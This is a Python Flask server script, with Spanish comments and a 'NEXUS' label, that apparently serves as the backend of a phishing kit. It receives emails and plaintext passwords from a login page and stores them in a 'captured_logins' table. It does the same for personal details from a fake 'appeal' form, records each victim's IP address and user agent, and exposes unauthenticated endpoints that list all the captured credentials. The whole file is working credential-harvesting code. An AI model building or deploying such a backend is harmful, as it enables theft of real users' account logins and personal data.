import sqlite3
import os
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import re

# --- Configuración de Flask ---
# Las rutas de las carpetas 'templates' y 'static' se definen directamente
# Asume que 'templates' y 'static' están al mismo nivel que app.py
app = Flask(__name__,
            template_folder='templates', # Apunta directamente a la carpeta 'templates'
            static_folder='static')      # Apunta directamente a la carpeta 'static'

CORS(app)

# --- Configuración de la Base de Datos SQLite ---
DATABASE = 'logins.db'

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with app.app_context():
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_logins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_forms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                full_name TEXT NOT NULL,
                contact_email TEXT NOT NULL,
                description TEXT NOT NULL,
                terms_accepted INTEGER NOT NULL,
                timestamp TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT
            )
        ''')
        conn.commit()
        conn.close()
    print("[NEXUS] → Base de datos SQLite inicializada y tablas verificadas.")

init_db()

# --- Rutas para servir la Single Page Application (SPA) ---
# Flask servirá automáticamente los archivos estáticos desde 'static_folder'
# para rutas que comienzan con /static/
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_vue_spa(path):
    if path.startswith('api/'):
        pass 
    return render_template('index.html')


# --- 1. Endpoint API REST para recibir credenciales de Login ---
@app.route('/api/submit_login', methods=['POST'])
def submit_login_data():
    if request.method == 'POST':
        try:
            data = request.json
            if not data:
                return jsonify({"status": "error", "message": "No se recibieron datos JSON."}), 400

            email = data.get('email')
            password = data.get('password')

            if not email or not password:
                return jsonify({"status": "error", "message": "Correo electrónico y contraseña son requeridos."}), 400
            if not isinstance(email, str) or not isinstance(password, str):
                return jsonify({"status": "error", "message": "Formato de datos inválido."}), 400
            if len(email) > 255 or len(password) > 255:
                return jsonify({"status": "error", "message": "Longitud de campo excedida."}), 400

            timestamp = datetime.now().isoformat()
            ip_address = request.remote_addr
            user_agent = request.headers.get('User-Agent')

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO captured_logins (email, password, timestamp, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)",
                (email, password, timestamp, ip_address, user_agent)
            )
            conn.commit()
            conn.close()

            print(f"[NEXUS] → Credenciales de login capturadas: Email={email}, IP={ip_address}")

            return jsonify({"status": "success", "message": "Credenciales recibidas y almacenadas."}), 200

        except Exception as e:
            print(f"[NEXUS] → Error al procesar la petición de login: {e}")
            return jsonify({"status": "error", "message": "Error interno del servidor."}), 500
    else:
        return jsonify({"status": "error", "message": "Método no permitido."}), 405

# --- 2. Endpoint API REST para recibir datos del formulario de Apelación (EN SQLite) ---
@app.route('/api/submit_form', methods=['POST'])
def submit_form_data():
    if request.method == 'POST':
        try:
            data = request.json
            if not data:
                return jsonify({"status": "error", "message": "No se recibieron datos JSON."}), 400
            
            full_name = data.get('fullName')
            contact_email = data.get('email')
            description = data.get('description')
            terms_accepted = 1 if data.get('termsAccepted') else 0

            if not full_name or not contact_email or not description or terms_accepted is None:
                return jsonify({"status": "error", "message": "Todos los campos del formulario son requeridos."}), 400
            if not isinstance(full_name, str) or not isinstance(contact_email, str) or not isinstance(description, str):
                 return jsonify({"status": "error", "message": "Formato de datos inválido en el formulario."}), 400
            if not isinstance(terms_accepted, int):
                 return jsonify({"status": "error", "message": "El campo 'termsAccepted' tiene un formato inválido."}), 400

            email_regex = r"^\S+@\S+\.\S+$"
            if not re.match(email_regex, contact_email):
                return jsonify({"status": "error", "message": "Formato de correo electrónico de contacto inválido."}), 400


            timestamp = datetime.now().isoformat()
            ip_address = request.remote_addr
            user_agent = request.headers.get('User-Agent')

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO captured_forms (full_name, contact_email, description, terms_accepted, timestamp, ip_address, user_agent) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (full_name, contact_email, description, terms_accepted, timestamp, ip_address, user_agent)
            )
            conn.commit()
            conn.close()

            print(f"[NEXUS] → Datos de formulario capturados y almacenados en SQLite: Email={contact_email}, IP={ip_address}")

            return jsonify({"status": "success", "message": "Datos de formulario recibidos y almacenados en SQLite con éxito."}), 200

        except Exception as e:
            print(f"[NEXUS] → Error al procesar la petición de formulario: {e}")
            return jsonify({"status": "error", "message": "Error interno del servidor."}), 500
    else:
        return jsonify({"status": "error", "message": "Método no permitido."}), 405

# --- 3. Endpoint API REST para ver los datos de Login capturados (con filtros) ---
@app.route('/api/view_captured_logins', methods=['GET'])
def view_captured_logins():
    conn = get_db_connection()
    cursor = conn.cursor()

    query_sql = "SELECT id, email, password, timestamp, ip_address, user_agent FROM captured_logins WHERE 1=1"
    params = []

    email_filter = request.args.get('email')
    if email_filter:
        query_sql += " AND email LIKE ?"
        params.append(f"%{email_filter}%")

    query_sql += " ORDER BY timestamp DESC"

    limit = request.args.get('limit')
    if limit:
        try:
            limit_int = int(limit)
            if limit_int > 0:
                query_sql += " LIMIT ?"
                params.append(limit_int)
        except ValueError:
            pass

    cursor.execute(query_sql, params)
    logins = cursor.fetchall()
    conn.close()

    logins_list = [dict(row) for row in logins]
    return jsonify(logins_list), 200

# --- 4. Endpoint API REST para ver los datos de Formulario capturados (con filtro de límite) ---
@app.route('/api/view_captured_form_data', methods=['GET'])
def view_captured_form_data():
    conn = get_db_connection()
    cursor = conn.cursor()

    query_sql = "SELECT id, full_name, contact_email, description, terms_accepted, timestamp, ip_address, user_agent FROM captured_forms WHERE 1=1"
    params = []

    query_sql += " ORDER BY timestamp DESC"

    limit = request.args.get('limit')
    if limit:
        try:
            limit_int = int(limit)
            if limit_int > 0:
                query_sql += " LIMIT ?"
                params.append(limit_int)
        except ValueError:
            pass

    cursor.execute(query_sql, params)
    forms = cursor.fetchall()
    conn.close()

    forms_list = [dict(row) for row in forms]
    for form_data in forms_list:
        form_data['terms_accepted'] = bool(form_data['terms_accepted'])

    return jsonify(forms_list), 200


if __name__ == '__main__':
    print("[NEXUS] → Servidor Flask en modo de desarrollo. Usar un WSGI para producción.")
    app.run(debug=True, host='0.0.0.0', port=5000)